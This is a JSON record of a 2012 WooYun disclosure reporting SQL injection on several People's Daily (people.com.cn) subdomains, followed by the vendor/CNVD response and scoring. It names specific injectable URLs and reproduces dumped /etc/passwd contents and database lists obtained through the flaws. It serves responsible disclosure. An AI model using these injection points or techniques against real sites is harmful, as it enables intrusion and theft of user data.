{"id": 20193, "wybug_id": "wooyun-2012-05772", "wybug_title": "人民网注入漏洞", "wybug_corp": "人民网", "wybug_author": "疏懒", "wybug_date": "2012-04-06 01:14", "wybug_open_date": "2012-05-21 01:15", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-05-21：\t细节向公众公开  简要描述： 人民网存在多处sql注入漏洞... 详细说明：  人民网存在多处sql注入漏洞,多处注入可拿到root权限...危害很大~!   漏洞证明：  先给几个危害不大的注入点：注入点:http://wapblog.people.com.cn/?sid=&wv=2数据库报错\n\n注入点：http://bianlun.people.com.cn/public/commentlist.php?channelid=36&page=2&uid=-1&did=1006http://bianlun.people.com.cn/public/commentlist.php?channelid=36&page=2&uid=-1'&did=1006\n\n注入点:http://comments.people.com.cn/bbs_new/app/src/main/?action=list&channel_id=64036http://comments.people.com.cn/bbs_new/app/src/main/?action=list&channel_id=64036 \n\n类似的的注入点很多爆出网站路径注入点：http://henan.people.com.cn/fz/show.php?days=\n\n直接就暴露了网站的绝对路径。下面几个注入点危害比较大了:注入点:http://paike.people.com.cn/xizang_yingwen/big.php?id=26可得到数据库名：xizang_yw，可直接读取/etc/passwd 文件（  /etc/passwd 文件是系统的主要文件之一。该文件中包含了所有用户登录名清单；为所有用户指定了主目录；在登录时使用的 shell 程序名称等。该文件还保存了用户口令；给每个用户提供系统识别号。）root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinrpm:x:37:37::/var/lib/rpm:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinnamed:x:25:25:Named:/var/named:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinident:x:98:98::/home/ident:/sbin/nologinpegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologindubo:x:500:500::/data/DocumentRoot:/bin/bashshequftp:x:501:501::/data/DocumentRoot/default/shequ:/bin/bash注入点：http://housedata.people.com.cn/house/index.php?m=Dongtai&a=scan&sid=622可爆数据库，表...注入点：http://live.sports.people.com.cn/worldcup2002/index2.php?id=377泄露数据库信息，管理员账号密码，可得到root权限。Data Bases: \tsports\t                bbs_live\t\tbifen\t\tenginsite_addons\t\tmeeting_live\t\tmeeting_livesub\t\tmysql\t\tsports\t\tsports_editor\t\ttw_live同样可以直接读取/etc/passwd 文件:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinrpm:x:37:37::/var/lib/rpm:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologindistcache:x:94:94:Distcache:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologinnamed:x:25:25:Named:/var/named:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologingdm:x:42:42::/var/gdm:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologin注入点：http://shop.techan.people.com.cn/index.php?app=store&id=31Data Bases: \tpeople_myshop_new\t                information_schema\t\tinnodb\t\tmysql\t\tnewshop\t\tpeople_ecmall\t\tpeople_ecmall2\t\tpeople_myshop\t\tpeople_myshop_chubanshe\t\tpeople_myshop_lipin\t\tpeople_myshop_new\t\tpeople_shop\t\tpeople_zhixiao\t\ttest\t\twenshicankao同样可以爆出数据库资料，管理员和用户信息，账号密码邮箱等等...可以直接读取/etc/passwd 文件:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinrpm:x:37:37::/var/lib/rpm:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologindistcache:x:94:94:Distcache:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologinnamed:x:25:25:Named:/var/named:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologin文件内容也有所不同，泄露了太多的重要信息...后面是漏洞的截图：\n\n\n\n\n\n\n\n   修复方案：  你懂的~  希望能尽快的修复。 还有真诚地希望能够得到证书的奖励~    版权声明：转载请注明来源 疏懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2012-04-06 17:14 厂商回复： CNVD确认所述所有注入点，复现相关过程，确认部分子站可获得较高权限。与WooYun-2012-05698一并协调涉事单位处置。对该漏洞评分如下：CVSS评分：(AV:R/AC:L/Au:NR/C:C/A:P/I:C/B:N) Score:9.67（最高10分，中危)即：远程攻击、攻击难度低、不需要用户认证，对机密性、完整性造成部分影响，对可用性造成部分影响。技术难度系数：1.0(一般)影响危害系数：1.4(较严重，涉及多个子站系统，有可能利用进行进一步渗透)综合评分：9.67*1.0*1.4=13.538 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-06 17:38 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  给力    \n     2012-05-09 11:52 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  我说我的为啥不通过呢，原来已经有了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}